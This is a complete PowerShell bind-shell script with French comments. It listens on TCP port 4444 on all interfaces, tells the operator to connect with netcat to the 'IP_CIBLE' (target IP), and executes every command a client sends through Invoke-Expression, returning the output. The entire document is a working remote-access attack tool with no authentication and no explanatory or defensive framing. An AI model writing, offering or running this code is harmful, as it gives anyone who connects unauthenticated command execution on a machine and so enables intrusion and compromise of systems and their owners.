$port = 4444  # Change le port si besoin (443, 8080, etc.)
$listener = [System.Net.Sockets.TcpListener]::new(0, $port)
$listener.Start()
Write-Host "Bind shell listening on 0.0.0.0:$port - Connect with: nc IP_CIBLE $port"

$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$buffer = New-Object byte[] 65536

# if connexion established, send a message on the client side
$message = "Connected to Bind Shell on port $port`nPS " + (Get-Location).Path + "> "
$bytes = [System.Text.Encoding]::ASCII.GetBytes($message)
$stream.Write($bytes, 0, $bytes.Length)

while(($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
    $cmd = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
    $output = Invoke-Expression $cmd 2>&1 | Out-String
    $response = $output + "PS " + (Get-Location).Path + "> "
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($response)
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
}

$client.Close()
$listener.Stop()
